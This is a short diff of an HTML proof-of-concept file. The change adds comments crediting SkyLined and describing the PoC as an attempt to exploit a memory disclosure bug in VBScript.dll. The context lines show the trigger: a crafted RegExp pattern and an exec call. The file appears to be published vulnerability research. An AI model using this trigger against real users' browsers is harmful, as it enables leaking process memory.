@@ -13,8 +13,12 @@
       End Function
     </script>
     <script language="Javascript">
+      // This PoC attempts to exploit a memory disclosure bug in VBScript.dll
+      // See http://blog.skylined.nl/20161108001.html for details.
       RegExpSetPattern("\u0504\u0706\u0908\u0B0A\u0D0C\u0F0E\u1110\u1312\u1514\u1716\u1918\u1B1A\\");
       var oObject = RegExpExecute("23456789ABCD\0");
+      // This work by SkyLined is licensed under a Creative Commons
+      // Attribution-Non-Commercial 4.0 International License. 
     </script>
   </head>
 </html>
